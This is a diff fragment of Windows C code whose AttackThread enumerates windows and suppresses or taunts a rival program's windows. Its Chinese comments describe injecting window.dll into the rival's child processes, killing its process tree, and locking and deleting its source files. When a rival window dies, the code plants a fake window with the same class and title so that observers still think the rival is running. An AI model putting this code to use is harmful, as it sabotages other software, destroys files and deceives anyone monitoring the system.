-                if (ownSuffix[0] && wcsstr(cls, ownSuffix)) bOwn = TRUE;
-                else if (ownSuffix[0] == L'\0') bOwn = TRUE;
-            }
-            if (bOwn) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
-
             DWORD pid = 0;
             GetWindowThreadProcessId(hWnd, &pid);
             if (pid == 0) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
+
+            /* 别打自己人的窗口。**不能**用"该进程里有我们的 window 模块"判断：
+               我们会把 window.dll 注入进 yy 的子进程（蜜罐 lenovo_fix.exe），
+               那样它的窗口会被误判成我方窗口直接跳过 —— 实测它的标题一直没人动就是这么来的。
+               改成：类名符合我方格式 `wnd_<16hex>`，或这个句柄正登记在弹窗持有者表里。 */
+            if (pid == GetCurrentProcessId() || IsOurOwnPopupWindow(hWnd, cls)) {
+                hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
+                continue;
+            }
 
             BOOL bTarget = FALSE;
             HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
@@ -737,21 +1211,26 @@ static DWORD WINAPI AttackThread(LPVOID lpParam)
                 }
                 CloseHandle(hProc);
             }
-            if (!bTarget) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
-
             WCHAR enemyCls[128], enemyTitle[256];
             wcscpy_s(enemyCls, _countof(enemyCls), cls);
             GetWindowTextW(hWnd, enemyTitle, _countof(enemyTitle));
 
-            PostMessage(hWnd, WM_CLOSE, 0, 0);
-            BOOL bClosed = FALSE;
-            for (int i = 0; i < 10; i++) {
-                if (!IsWindow(hWnd)) { bClosed = TRUE; break; }
-                Sleep(50);
+            /* 新规则：
+               **本体（yy.exe/ww.exe）只嘲讽、不压制** —— atkcore 的 waste 模仿线程要往它的
+               日志框里连发 10 条嘲讽，一旦我们隐藏/挂到不可见父窗口/最小化，嘲讽就没人看得见；
+               10 条发完后由 atkcore 结束它的进程树并锁死删除源文件。
+               **子进程（蜜罐 lenovo_fix.exe 等）**照常压制（改标题/隐藏/挂父窗口/最小化），
+               因为它们接下来会被直接杀掉+锁死+删除，死之前也别让它发出存活证明。 */
+            if (bTarget) {
+                TauntEnemyWindowOnly(hWnd);
+            } else {
+                WriteLog(L"压制 yy 子进程窗口 PID=%lu（该进程随后被杀掉+锁死+删除源文件）", pid);
+                AttackEnemyWindow(hWnd, ownSuffix);
             }
-            if (!bClosed) PostMessage(hWnd, WM_QUIT, 0, 0);
 
-            if (bClosed || !IsWindow(hWnd)) {
+            if (!IsWindow(hWnd)) {
+                /* 窗口真被销毁了（或对手自己退出了）：用它的类名/标题占位建一个假窗口，
+                   让只按"窗口存在"判定的观察者看到 yy 的窗口还在 */
                 WNDCLASSW wc = { 0 };
                 wc.lpfnWndProc = DefWindowProcW;
                 wc.hInstance = GetModuleHandleW(NULL);
